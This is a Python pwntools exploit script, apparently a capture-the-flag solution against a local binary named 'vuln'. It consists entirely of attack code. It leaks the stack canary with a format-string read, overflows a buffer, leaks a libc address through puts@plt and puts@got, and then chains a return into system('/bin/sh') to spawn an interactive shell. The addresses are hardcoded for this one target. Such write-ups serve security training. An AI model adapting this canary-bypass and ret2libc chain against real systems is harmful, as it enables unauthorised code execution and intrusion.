#!/usr7bin/python3
from pwn import process, p32, u32

shell = process("./vuln")

shell.sendlineafter(b"?\n", b"-3727")
shell.sendlineafter(b"? ", b"%135$p")
shell.recvuntil(b": ")

canary = int(shell.recvline().strip(), 16)

offset = 512
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(canary)
payload += b"B" * 12
payload += p32(0x80484c0) # puts@plt
payload += p32(0x80487ff) # main()
payload += p32(0x8049fdc) # puts@got

shell.sendlineafter(b"?\n", b"-3727")
shell.sendlineafter(b"? ", payload)
shell.recvlines(2)

libc_base = u32(shell.recv(4)) - 0x67560

payload  = b""
payload += junk
payload += p32(canary)
payload += b"B" * 12
payload += p32(libc_base + 0x03cf10) # system()
payload += p32(libc_base + 0x030160) # exit()
payload += p32(libc_base + 0x17b9db) # "/bin/sh"

shell.sendlineafter(b"?\n", b"-3727")
shell.sendlineafter(b"? ", payload)
shell.recvlines(2)

shell.interactive()
